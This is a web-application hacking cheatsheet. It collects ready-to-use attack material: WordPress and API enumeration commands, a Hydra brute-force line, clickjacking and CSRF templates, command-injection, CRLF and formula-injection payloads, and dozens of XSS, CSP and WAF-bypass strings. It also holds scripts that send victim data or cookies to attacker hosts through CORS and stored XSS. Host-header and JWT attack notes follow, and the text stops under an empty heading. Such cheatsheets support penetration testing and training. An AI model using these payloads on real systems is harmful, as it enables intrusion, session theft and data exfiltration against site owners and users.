# Web Cheatsheet

## Information Gathering

Enumerate server technology by 404 page; see [this](https://0xdf.gitlab.io/cheatsheets/404#)

## CMS

### Liferay

Administrative default pages:

```
?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin&saveLastPath=false

?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fcreate_account&saveLastPath=false

?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fforgot_password&saveLastPath=false

/c/portal/control_panel

/portal/invoker

/api/jsonws
```

### Wordpress

Version Enumeration:

- Check WordPress Meta Generator Tag.
- Check the WordPress readme .html/license. txt file
- Inspect HTTP response headers for version information (X-Powered-By).
- Check the login page for the WordPress version as it is usually displayed.
- Check the WordPress REST APl (/wp-json/) and look for the version field in the JSON response.
- Analyze JS and CSS files for version information.
- Examine the WordPress changelog files with information on version updates.
- Look for files like changelog.txt o readme.txt in the WordPress directory.

Users Enumeration:

- Username ID brute force - You can enumerate valid users from a WordPress site by Brute Forcing user IDs (Look for 200 responses): `curl -s -I -X GET http://wordpress.com/?author=1`
- You can try to enumerate users by querying the WordPress API on wp-json:  `curl http://wordpress/wp-json/wp/v2/users`
- Try logging in on /wp-login.php and analyze the responses to verify if a user exists.

Plugin Enumeration:

- `curl -s -X GET https://wordpress.com/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2`

 Theme Enumeration:
 
- `curl -s -X GET https://wordpress.com/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2`

Files & Directories Enumeration:

 - /wp-login.php (This is usually changed to /login.php for security)
 - /wp-admin/login.php
 - /wp-admin/wp-login.php
 - xmlrpc.php
 - /wp-content - Primary directory used to store plugins and themes.
 - /wp-content/uploads/ - Directory where uploaded files are stored (Usually prone to directory listing).
 - /wp-config.php

Wordpress Nmap Scripts:

- http-wordpress-brute - [(see args)](https://nmap.org/nsedoc/scripts/http-wordpress-brute.html)
- http-wordpress-enum - [(see args)](https://nmap.org/nsedoc/scripts/http-wordpress-enum.html)
- http-wordpress-users - [(see args)](https://nmap.org/nsedoc/scripts/http-wordpress-users.html)
## API Testing

Interesting endpoints: 

```
/api
/swagger/index.html
/openapi.json
/api/swagger/v1
/api/swagger
/openapi/ui/
```

When fuzzing API endpoint via **SSRF** or **Server-Side Parameter Pollution**, it's worth trying to append a `%23` (URL-Encoded #) to break the URL parsing when the server is appending some stuff AFTER the injected payload:

```
https://vulnerablesite/path_before/{{injection_point}}/{{?query_params or path slices appendend by the server}}
```

## Bruteforcing

Brute-force HTTP POST form with Hydra:

```
hydra -c 1 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.118 http-form-post '/admin/:username=^USER^&password=^PASS^:Login'
```

Interesting not common endpoints:

```
/_vti_pvt/service.pwd # https://stackoverflow.com/questions/1163820/what-are-vti-cnf-vti-pvt-vti-script-and-vti-txt-folders
/__better_errors # https://github.com/BetterErrors/better_errors?tab=readme-ov-file#better-errors - Debug console can allow RCE
home/000~ROOT~000 # https://github.com/stefanpejcic/wordpress-malware/blob/9b74dec23ed0e8041f9c49de1fcd568f5342796e/23.10.2020/sy.php - Symlink attack already carried out by other attackers
```
## Broken Access Control

Here's a list of worth-to-try restriction bypasses:

- Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`. If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass access controls like `DENY: POST, /admin/deleteUser, managers`.
- The Spring framework have enabled the `useSuffixPatternMatch` option. This allows paths with an arbitrary file extension to be mapped to an equivalent endpoint with no file extension. In other words, a request to `/admin/deleteUser.anything` would still match the `/admin/deleteUser` pattern. Prior to Spring 5.3, this option is enabled by default.
- Append a trailing `/`: `/admin/deleteUser` to `/admin/deleteUser/`.
- Uppercase the URL path: `/admin/deleteUser` to `/ADMIN/DELETEUSER`.
- Try different HTTP verbs.
- `Referer` header tampering if the application has Referer-based access controls.

## Clickjacking

Basic template:

```html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

To bypass frame busting scripts, it's useful to use the iframe `sandbox` attribute with the `allow-forms`, `allow-scripts`, `allow-top-navigation`; when these values are set, the irame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-script allow-top-navigation"></iframe>
```

## Command Injection

Basic payloads:

```shell
& command &
&& command &&
; command ;
| command |
|| command ||
; $(subcommand) ;
; `subcommand` ;

# newline
0x0a 
\n
```

Time-base feedback for Blind OS command-injection to exfiltrate data, eventually URL Encoded:

```bash
# > whoami
# jack

c=$(whoami) && if [[ "$c" =~ "ja" ]]; then sleep 2;fi 
```


## Content Security Policy

### Bypasses

It's possible to bypass a CSP like `default-src 'none'; base-uri 'none';` by exploiting an eventual dangling markup injection, setting a `<base>` tag with the attribute `target`having only the opening quote (dangling). The value of this attribute from the `<base>` tag sets the value for the `window.name` property **for every link in the page**.

An attacker could somehow make the user click on a `<a>`; being the `target` attribute for the `<base>` tag dangling, its value (so the `window.name`) will contain the HTML code following the dangling attribute until a closing quote is found, allowing to partially exfiltrate the page content. 

```html
<a href=http://evilsite>You must click me</a><base target="
```

Note: **if the double quote `"` does not work, try with a single quote `'`.**

Edge will drop the entire policy when it encounters invalid syntax; if some user controllable input gets reflected in the CSP, when using edge it's sufficient to inject some breaking characters such as `;_` in order to make the whole CSP be dropped.

```
https://vulnerablesite?values=etc&token=SOME_REFLECTED_VALUE;_
```

With Chrome/Firefox this is not possible; instead it's possible to overwrite `script-src` by injecting the `script-src-elem` directive which specifies which controls only script blocks and not also inline event handlers, differently from `script-src`.

```
http://vulnerablesite?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://evilsite/xss.js%22%3E%3C/script%3E
```

Bypass `form-action` directive:
[CSP form-action Bypass with reflected XSS ](https://labs.detectify.com/ethical-hacking/content-security-policy-csp-bypassing-form-action-with-reflected-xss/)

## CRLF Injection

Some payloads:

```
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
```
## Cross-Origin Resource Sharing (CORS)

`GET`and  `HEAD` requests do not generally require a preflight `OPTION` request.

- `POST` requests using non-standard content type such as `application/json` **will** generate a preflight request to the server. 
- Instead, content types such as `application/x-www-form-urlencoded` or `multipart/form-data` **will not**.

This is relevant since a server may accept arbitrary origins for `POST` requests **but not** for `OPTIONS` requests:

- If that's the case, only `POST` with standard content types can be exploited.

Exploit CORS misconfiguration with `fetch` to exfiltrate data to an attacker controlled server:

```javascript
fetch("http://concord:8001/api/service/console/whoami", {
		credentials: 'include'
	})
	.then(async (response) => {
		let data = await response.text();
		fetch("http://<attacker controlled server>/?data=" + atob(data))
	})
```


`Access-Control-Allow-Origin` (ACAO) is set to null for:

- Cross-origin redirects
- Requests from serialized data
- Requests using non-hierarchical schemes such as `file:` or `data:`
- Sandboxed cross-origin requests

It's possible to use sandboxed `iframe` to generate a cross-origin request with the `null` Origin:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Cross-Site Request Forgery (CSRF)

CSRF Payload setting up a file into the form to be submitted:

```html
<html>

<head>
    <script>
        setTimeout(() => {

            const input = document.querySelector('input[type="file"]');

            const defaultFile = new File(
                ["<file content>"],
                "<filename>",
                { type: "<mime type>"}
            );

            const dt = new DataTransfer();
            dt.items.add(defaultFile);

            input.files = dt.files;

            const form = document.querySelector('form');
            form.submit()

        }, 500)


    </script>
</head>

<body>
    <form enctype="multipart/form-data" action="http://<target>" method="post"
        id="csrf">
        <button type="submit">CSRF</button>
        <input type="file" name="<fieldname>" />
    </form>
</body>

</html>
```
### SameSite Cookies

Some applications do not validate that the token belongs to the same session as the user who is making the request.

In the context of the SameSite, when determining whether a request is same-site or not, the **site** is considered as the `scheme` plus the `TLD + 1`.

**Example**: for the URL https://app.example.com, the **site** is considered as `https://` and `example.com`.

Note: the concept of **site** for the **SameSite** cookies is different from the concept of **origin** for the **SameOrigin** policy.
Instead, two URLs are considered to have the same **origin** if they share the exact same scheme, domain name, and port.

**Example**: https://app.example.com:443 IS the origin

Difference between site and origin:

- A site encompasses multiple domain names, whereas an origin only includes one.

SameSite supports three restriction levels:

- **Strict**: browsers will not send it in any cross-site requests.
- **Lax**: browsers will send the cookie in cross-site requests only for `GET` requests generated from a top-level navigation by the uses (ex: the user clicked a link). The cookie are not included in `POST` and background requests (images, scripts, iframes).
- **None**:  browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites. When `SameSite` is set to `None`, the `Secure` attribute is mandatory for the cookie.

These levels can be explicitly set in the cookie definition with the `SameSite` attribute:

```
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

Generally, `Lax` is the default. When `Lax` is set by default (**not when it's explicited!**), browsers wait 120 seconds for **top-level** `POST` requests before enforce the `Lax` restrictions. This is needed in order to not break SSO mechanisms which involve cross-site requests.

Note: Applications that accept only POST requests with `application/json` content type **ARE NOT** vulnerable to CSRF since `<form>` do not support this mime type in his `enctype` attribute (that determines the mime type to use when submitting data with the form).
### Bypasses

#### Generic Bypasses

- Some applications correctly validate the token when the request uses the **POST** method but skip the validation when the **GET** method is used; try switching the method to GET.
- Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
- Some applications do not validate that the token belongs to the same session as the user who is making the request; an attacker could generate a valid CSRF token simply by using its legit account.

#### SameSite Cookie Bypasses

It's possible to bypass a `Lax` SameSite policy by forcing the request method to be `GET`; even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line.

*Symfony* supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Note: Other frameworks support a variety of similar parameters.

It could be possible to bypass a `Strict` SameSite restriction by abusing some client-side vulnerabilities such as XSS or DOM-based open redirects; since client-sides redirects are not treated as server-side redirects by the browsers, **being the requests actually same-site**, the cookies and will be included.

When dealing with SSO, **if a client-side gadget that enables to refresh the SSO cookie is found**, could be possible to abuse the 120 seconds window wherein the browsers do not apply the `Lax` restrictions for top-level requests.

- Find a client-side gadget
- Use a top-level navigation to force the SSO cookie refresh; it must be a top-level navigation* so that the cookies are passed to the request to the SSO provider. Being already authenticated, the user shouldn't be asked to login again, a new cookie should just be issued.
- Perform the CSRF attack within the 120 seconds window.

**Note**: after the refresh the victim should be redirected to the attacker site in order to perform the CSRF attack; this isn't easy feasible. A better approach is to force the browser to open a new tab for the refresh:

```javascript
// use windows.onclick in order to prevent popup to be blocked by default by the browser
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```

#### Referer Bypasses

Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted. 

Force the browser to drop the `Referer` header by setting the following `<meta>` within the page hosting the CSRF attack:

```html
<meta name="referrer" content="no-referrer">
```

Modern browsers, in order to attempt to mitigate the risk of data leaking, generally strip query strings from the `Referer` value, which may contain sensitive data.
This behaviour can be overridden by setting the  header `Referrer-Policy` with the value `unsafe-url`, or by including the following `<meta>`, in the CSRF attack:

```html
<meta name="referrer" content="unsafe-url">
```
## Cross-Site Scripting (XSS)

When using Chrome, from version 92 onward, cross-origin iframes are prevented from calling `alert()`; use instead `print()` for PoC.

An alternative to `%0D%0A` when space are escaped/encoded is to use the hyphen `-`.

It's possible to force focus on an element by using `iframe` like follows (useful for phishing):

```html
<iframe src=https://targetvulnerablesite onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

It's also possible to force some user action by using `iframe` like follows:

```HTML
<iframe src =my-account onload = this.contentDocument.forms[1].submit() >
```

Useful resources:

- [Shazzer](https://shazzer.co.uk/)
### DOM Cross-Site Scripting

The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire.

DOM XSS common sources:

```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

DOM XSS common sinks:

```javascript
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

### src Attribute XSS

XSS on  `src` attribute:

```html
<script src="data:,alert(1)"> </script>
<script src="javascript:new Function['PoC'].find(alert)"></script>
```



### Hidden Input XSS 

XSS on hidden-type input:

```php
// Vulnerable to accesskey + onclick
// Not vulnerable to type overwriting
// ?xss=" accesskey=X onclick=alert(1);//
<input type="hidden" value="<?= $_GET['xss'] ?>" /> 

// Vulnerable to type overwriting
// ?xss=" type=image src=x onerror=alert(1);//
<input value="<?= $_GET['xss'] ?>" type="hidden" /> 
```

Another payload using `oncontentvisibilityautostatechange` attribute (works on Chrome and Edge):

```html
<input type=hidden
oncontentvisibilityautostatechange=alert(1)
style=content-visibility:auto>
```

### Phone Number Input XSS

If the library parses phone numbers according to RFC and accepts optional parameters such as "phone-context":

```html
10203040;𝐩𝐡𝐨𝐧𝐞-𝐜𝐨𝐧𝐭𝐞𝐱𝐭=<𝐬𝐜𝐫𝐢𝐩𝐭>𝐚𝐥𝐞𝐫𝐭(1)</𝐬𝐜𝐫𝐢𝐩𝐭>
```

### Content-Type abuse

Take a look there: [Content-Type that can be used for XSS](https://github.com/BlackFan/content-type-research/blob/master/XSS.md).

If content-type is `image/svg+xml`:

```svg
<!DOCTYPE svg [
	<!ENTITY lol "alert(1)">
	<!ENTITY a "data:,&lol;">
]>

<svg width="200" height="188" xmlns="http://www.w3.org/2000/svg">
	<script href="&a;"></script>
</svg>
```

### Javascript URL XSS

When the payload gets reflected into the value of a **Javascript URL** (`javascript:`), even though keys chars such as brackets, single quote, double quotes, etc. reflect in the URL-encoded form, they still might be interpreted and therefore allow to perform XSS attacks:

```html
<!-- Example: -->
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26REFLECTED_VALUE'}).finally(_ => window.location = '/')">

<!-- Even though the single quote is URL-encoded (%27), -->
<!-- when the javascript: content is interpeted, it breaks the string and allows to inject additional code  -->
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')">
```

When there reflection happens in an attribute value, it's possible to use HTML encoding to bypass escaping and filters.

### jQuery DOM XSS

Common jQuery sinks:

```javascript
add()
after()
append()
animate()
attr()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

jQuery can be vulnerable via the `$()` selector sink if the attacker has full control over its input from a source that doesn't require a `#` prefix. The `$()` would create a new DOM element if the specified selector does not exists:

```javascript
$(<injected payload>) // Working
Example: $('<img src=x onerror=alert(1)>')

$('#' +<injected payload>) // Not Working
Example: $('#<img src=x onerror=alert(1)>')
```

Exploit jQuery `hashchange` event handler:

```javascript
// Vulnerable Code
$(window).on('hashchange', function(){
	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
	if (post) post.get(0).scrollIntoView();
});
```

- **Exploit (Self-XSS)**: Change from `https://vulnreablesite` to `https://vulnreablesite/#<img src=1 onerror=alert(1)>`
- **Exploit (PoC XSS)**:`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`

### Angular JS XSS

Exploit AngularJS `ng-app` directive; if any HTML node has the `ng-app` directive then anywhere within this node or its children a `{{javascript exception}}` string is found, it is interpreted by AngularJS.

Example:

```html
<html>
<head>...</head>
<body>
...
	<div ng-app>
	...
		<p>{{constructor.constructor('alert(1)')()}}</p>
	...
	</div>
...
</body>
</html>
```

### Useful Scripts
Stored XSS payload exiltrating cookie or making the victim perform some actions:

```javascript
// Cookie exfiltration

window.addEventListener('DOMContentLoaded', (event) => {

	var xhr = new XMLHttpRequest();
	xhr.open("POST", "post/comment", true);
	
	var formData2 = new FormData();
	formData2.append("csrf", document.getElementsByName("csrf")[0].value);
	formData2.append("postId", 9);
	formData2.append("comment", document.cookie);
	formData2.append("name", "pwned");
	formData2.append("email", "test@test.test");
	formData2.append("website", "http://test.test");
	xhr.send(formData);

});
```


Stored XSS payload making the victim perform some actions:
```javascript
// www-form-urlencoded + perfom actions
window.addEventListener('DOMContentLoaded', (event) => {

	var xhr1 = new XMLHttpRequest();
	xhr1.open("GET","my-account",true);
	xhr1.onreadystatechange = function() {
	
		if (this.readyState == 4 && this.status == 200) {
			var parser = new DOMParser();
			var myAccountDoc = parser.parseFromString(xhr1.responseText, "text/html");
			var csrf = myAccountDoc.getElementsByName("csrf")[0].value;
			var xhr2 = new XMLHttpRequest();
			
			xhr2.open("POST","my-account/change-email",true);
			xhr2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			
			var data = "email=pwned@normal-user.net&csrf="+csrf;
			xhr2.send(data);
		}
	};
	
	xhr1.send();
});
```

### Bypasses

Prepend additional `<`:

```html
<<script>alert(1)/script>
```

Remove closing tag :

```html
<script>alert(1)
```

Double open angle brackets:

```html
<iframe src=http://malicious.com <
```

Use uncommon tags such as `<style>`:

```html
<STYLE>.classname{background-image:url("javascript:alert('XSS')");}</style>
```

Use extra characters:

```html
<a aa aaa aaaa aaaaa aaaaaa aaaasaa aaaaaaaa aaaaaasaaa href=javascript:alert(1)>xss</a>
```

Use octal encoding:

```html
javascript:74163166147401571561541571411447514115414516216450615176
```


Uppercase XSS with Unicode entity:

```html
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
```

SVG XSS when all events handler and the href attribute are blocked (requires interaction):

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

No parenthesis:

- [Invoking a function without parentheses - StackOverflow](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses)
- [The seventh way to calla a javascript function without parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
- [Executing non-alphanumeric javascript without parenthesis](https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis)

```javascript
alert`1337` // backticks replace brackets

throw onerror=alert,1337

onerror=alert;throw 1

Function`x${'alert\x281337\x29'}x```

'alert\x281337\x29'instanceof{[Symbol['hasInstance']]:eval}

valueOf=alert;window+''

x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x

// or any DOMXSS sink such as location=name
```

Polyglots:

```HTML
1'"--><A HRef AutoFocus OnFocus​=alert(1)//> # HTML Context
1<​/Script><​Script>1/*'/*\'/**//alert(1)// # JS Context
```

HTML entities used as JS variables:

```HTML
<img src=data: onerror=&Xopf;=alert;&Xopf; (1)>

xss"><iframe srcdoc="%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

Bypass Akamai, Imperva and CloudFlare:

```html
<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
```

Bypass CloudFlare:

```html
<svg onload=alert&#0000000040document.cookie)>
```

Every HTML tag has the `baseURI` property. Using `<base>` allows you to change the `baseURI`:

```HTML
<base href=x:alert(1) onfocus=eval(baseURI) tabindex=1 style=display:block autofocus>
```

No spaces and quotes abusing regex:

```HTML
<svg/onload=parent [/al/.source+/ert/.source] (1)>
```

No spaces, quotes and + sign abusing regex:

```HTML
<svg/onload=parent(/al/.source.concat(/ert/.source)] (2)>
```

No spaces and using **Zero Width No-Break Space html entity**:

```HTML
<img/src/onerror=alert&#xFEFF;(1)>
```

Using **Reflection**:

```HTML
<a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')
(Reflect get(document,'coo'+ 'kie'))">
```

Using No spaces + case variation + **double assignment**:

```html
"><img/src="X"/OnErRor=x=alert`XSS`><!-
```

No `>` and  char limit to 35:

```html
<svg onload="alert(1)" <="" svg=""
```

HTML encoding:

```html
<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;>clickme</a>
```

Use `top`, the top-level window object in browser:

```HTML
javascript:top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);

# URL Encoded with some LF
%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
```

Encoding bypasses:

```html
%C0%BCscript>alert(1)</script>
%E0%80%BCscript>alert(1)</script>
%F0%80%80%BCscript>alert(1)</script>
%F8%80%80%80%BCscript>alert(1)</script>
%FC%80%80%80%80%BCscript>alert(1)</script>
```

Miscellaneous payloads:

```html
<p style="height:100px" onwheel="self['al'+'ert'](self['ev'+'al']
('docu'+'ment.coo'+'kie')"></p>

# Close a JS Comment with svg data
<svg>  
<​script>  
/*  
<![CDATA[*]]><![CDATA[/]]>alert(1)-/\*/  
<​/script>
```

Useful resources:

 - [XSSChallengeWiki](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml)


## DOM Clobbering

It's possible to generate **global variables inside the JS context** with the attributes `id` and `name` in HTML tags.

Reference: [DOM Clobbering - Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)

The implementation for the `toString()` for an `a` element is its `href` attribute.

```html
<!-- Clobber an array/object -->
<a id=x>
<a id=x name=y href=somevalue>
<script>
console.log(x[1]) //Output: somevalue
console.log(x.y) //Output: somevalue
</script>

<!-- Clobber a 2nd level object with <form> -->

<form id=x name=y><input id=z value=somevalue></form>
<form id=x></form>
<script>
alert(x.y.z.value) //Output: somevalue
</script>
```

**DOM Purify** bypass: DOMPurify allows you to use the `cid:` protocol, which **does not URL-encode double-quotes**. This means you can **inject an encoded double-quote that will be decoded at runtime**. 

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
 
 In the previous snippet the HTML encoded `&quot;` will be **decoded on runtime** and **escape** from the attribute value to **create** the `**onerror**` event.

## GraphQL

Common GraphQL endpoints:

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/graphql/v1
/api/v1
/api/graphql/v1
/graphql/api/v1
/graphql/graphql/v1
```

### Universal Query

If you send `query{__typename}` to any GraphQL endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.
- Every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string.
- GraphQL services will often respond to any non-GraphQL request with a "query not present" or other similar errors
### Enumerate endpoint accepted methods
Generally, GraphQL endpoint accept POST requests with `application/json` content-type.
However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of `x-www-form-urlencoded`.

- To enumerate other accepted methods, try resending the universal query using alternative HTTP methods.

### Introspection

Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.

It is best practice for introspection to be disabled in production environments, but this advice is not always followed. Following the GraphQL query to probe if introspection is enabled: `{ "query": "{__schema{queryType{name}}}" }`

If introspection is enabled, run the following query to return full details on queries, mutations, subscriptions, types and fragments:

```
 #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

**Note**: If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField` directives from the query structure.

If introspection is protected by regex-based control such as blocking the query if matches `__schema{`, it can be bypassed by adding a new line after `__schema`.
Another possible bypass is to try changing method from `POST` to `GET` or change the content-type from `application/json` to `x-www-form-urlencoded`.
**Try also combining both the bypasses.**


If introspection is disabled, take a look at [Clairovoyance](https://github.com/nikitastupin/clairvoyance). Clairvoyance helps to obtain GraphQL API schema even if the introspection is disabled using **suggestions** (when enabled, suggestions return messages such as "There is no entry for 'productInfo'. Did you mean 'productInformation' instead?" that can help mapping the schema even though the introspection is disabled).

### Rate limit bypass

It's possible to use aliases to return multiple instances of the same type of object in one request.
Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because **aliases effectively enable you to send multiple queries in a single HTTP message**, they can bypass this restriction.

## Formula Injection

General CSV/XLSX formula injection payload:

```
=cmd|' /C calc'!A0
```

## Host Header Attacks

Useful resources: [Password Reset Poisoning](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)

The `X-Forwarded-Host` (XFH) header is a standard header for identifying the original host requested by the client generally used when the original requested service is behind reverse proxies (load balancers, CDNs). 
It could be enabled by default and exploitable to perform Host Header injections.

Following some other headers with similar purposes as `X-Forwarded-Host`:

- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`

Web servers allow a port to be specified in the Host header, but ignore it for the purpose of deciding which virtual host to pass the request to; it's possible to inject an evil host with the following payload:

```
POST /targeturl HTTP/1.1
Host: legitmhostname:@evilhostname
```

Sometimes it's possible to bypass IP-based restrictions using the `X-Forwarded-For` or `X-Real-IP` headers.

Another possible approach is to try adding duplicate Host headers, useful when different system are involved and their host header handling is different:

```
GET /targeturl HTTP/1.1
Host: vulnerable-website.com # <--- Correctly routes the request
Host: bad-stuff-here # <--- used by the second system
```

A variant to this attack is to indent an host header since it could be ignored by the first system since it's not `^Host: .*$` but processed by the second one.

Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results and route the request to an upstream URL.

Example:

```
GET @private-intranet/example HTTP/1.1
```

- The resulting upstream URL will be http://backend-server@private-intranet/example

Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection.

- send an innocent-looking initial request followed by a malicious one down the **same connection**.
### Misc

Leak `nginx` internal server name by providing a request with HTTP/1.0 and no `Host`header.

- This is possible when an HTTP response reflects the request's headers.
- [Blank host header trick](https://medium.com/the-volatile-triad/hacking-the-blank-host-header-trick-e280efbaf274)


## Javascript Injection

Common sinks:

```javascript
eval()
Function()
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```


## JWT Attacks

- Check if the application accepts tokens with invalid signature.
- Check if the application accepts tokens with no signature by setting the `alg` header parameter to `none`.
- Try bruteforcing the JWT secret signing key.
- Header parameter injections:
	-  via the `jwk` header parameter.
	-  via the `jku` header parameter.
	-  via the `kid` header parameter; it could be vulnerable to path-traversal or SQLi. If vulnerable to path traversal, try using `/dev/null` as key in order to sign the JWT with an empty string.
	- via `cty` header parameter to change the content type to `text/xml` or `application/x-java-serialized-object`, which can potentially enable new vectors for XXE and deserialization attacks. 
- Try algorithm confusion attacks.

### Algorithm Confusion Attacks

